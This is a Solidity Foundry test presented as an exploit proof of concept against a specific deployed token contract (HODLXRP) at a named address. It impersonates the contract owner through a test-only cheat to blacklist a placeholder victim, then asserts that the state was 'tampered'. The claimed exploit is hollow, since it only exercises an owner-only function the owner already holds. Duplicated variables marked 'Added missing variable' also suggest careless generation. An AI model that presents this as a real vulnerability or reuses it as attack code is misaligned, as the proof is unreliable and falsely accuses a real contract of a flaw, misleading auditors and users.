pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IHODLXRP {
    function getOwner() external view returns (address);
    function setBlacklistEnabled(address, bool) external;
    function isBlacklisted(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x32Ef0cE6078cfdEF67f3E21D40d3eE9D437A7B06;
    address attacker = address(this);
    address victim = address(0x123); // Added missing variable
    address victim_address = address(0x123); // Added missing variable

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = IHODLXRP(TARGET).getOwner();

        // Impersonate the owner to call privileged function
        vm.prank(owner);
        IHODLXRP(TARGET).setBlacklistEnabled(victim, true);

        // Verify the victim is now blacklisted
        bool isBlacklisted = IHODLXRP(TARGET).isBlacklisted(victim);
        require(isBlacklisted, "Victim should be blacklisted");
        assertEq(IHODLXRP(TARGET).isBlacklisted(victim_address), true, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

